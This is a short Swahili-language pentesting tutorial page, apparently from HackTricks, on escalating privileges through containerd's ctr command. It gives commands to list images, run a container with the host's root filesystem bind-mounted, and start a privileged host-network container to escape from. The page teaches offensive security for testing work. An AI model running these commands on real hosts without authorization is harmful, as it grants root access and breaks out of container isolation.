# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Nenda kwenye kiungo kinachofuata kujifunza **ni nini containerd** na `ctr`:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE 1

ikiwa unapata kwamba mwenyeji ana amri ya `ctr`:
```bash
which ctr
/usr/bin/ctr
```
Unaweza kuorodhesha picha:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Na kisha **kimbia moja ya hizo picha ukitunga folda ya mizizi ya mwenyeji nayo**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Kimbia kontena lenye mamlaka na kutoroka kutoka kwake.\
Unaweza kukimbia kontena lenye mamlaka kama:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
Kisha unaweza kutumia baadhi ya mbinu zilizotajwa kwenye ukurasa ufuatao ili **kutoroka kutoka kwake kwa kutumia uwezo wa kijasiri**:

{{#ref}}
docker-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
